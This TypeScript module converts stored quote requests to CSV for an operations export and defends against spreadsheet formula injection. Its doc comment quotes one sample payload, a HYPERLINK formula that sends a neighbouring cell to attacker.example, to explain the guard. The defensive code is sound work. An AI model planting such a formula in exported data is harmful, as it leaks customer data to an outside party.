import type { StoredRfq } from "@/lib/rfqStore";

/**
 * RFQ book → CSV for the ops export (quoting, follow-up, QuickBooks entry).
 * Pure and unit-tested; the ops-authed export route streams this.
 */

/**
 * Neutralises a field a spreadsheet would otherwise run as a formula.
 *
 * RFC 4180 quoting is about parsing, not safety: Excel and Google Sheets
 * evaluate a leading =, +, -, @, tab or CR even inside a quoted field. Every
 * text column here is typed by whoever filled in the request form, and this
 * file exists to be opened in a spreadsheet — a company name of
 * `=HYPERLINK("http://attacker.example/?d="&A1,"Open invoice")` renders as a
 * working link in the desk's copy and sends the neighbouring cell to whoever
 * asked for it when clicked.
 *
 * Prefixing with an apostrophe is the standard mitigation: spreadsheets read
 * it as "the rest is text". It is visible in some tools, which is the accepted
 * trade — a stray apostrophe in front of an odd company name is a smaller
 * problem than the desk's spreadsheet dialling out.
 */
function deFormula(s: string): string {
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/** RFC 4180 field escaping, over a value that can no longer act as a formula. */
function csvField(v: unknown): string {
  const s = deFormula(String(v ?? ""));
  return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

export function rfqsToCsv(rfqs: StoredRfq[]): string {
  const header = [
    "ref", "created_at", "updated_at", "status", "freight",
    "company", "first_name", "last_name", "email", "phone", "phone_ext",
    "serial", "ship_address", "billing_address", "wants_account",
    "items", "total_units", "message",
  ];
  const rows = rfqs.map((r) => [
    r.ref, r.createdAt, r.updatedAt, r.status, r.freight ? "yes" : "no",
    r.contact.company, r.contact.name, r.contact.lastName ?? "", r.contact.email,
    r.contact.phone ?? "", r.contact.phoneExt ?? "", r.contact.serial ?? "",
    r.contact.shipAddress ?? "",
    r.contact.billingSameAsShipping === false ? (r.contact.billingAddress ?? "") : "same as shipping",
    r.contact.wantsAccount === false ? "no" : "yes",
    // Configuration rides with its own line item: a spreadsheet row that says
    // only the base SKU would have the desk quoting the standard build.
    r.items
      .map((it) => `${it.sku} x${it.qty}${it.config?.length ? ` (${it.config.join("; ")})` : ""}`)
      .join("; "),
    r.items.reduce((n, it) => n + it.qty, 0),
    r.message ?? "",
  ]);
  return [header, ...rows].map((row) => row.map(csvField).join(",")).join("\r\n") + "\r\n";
}
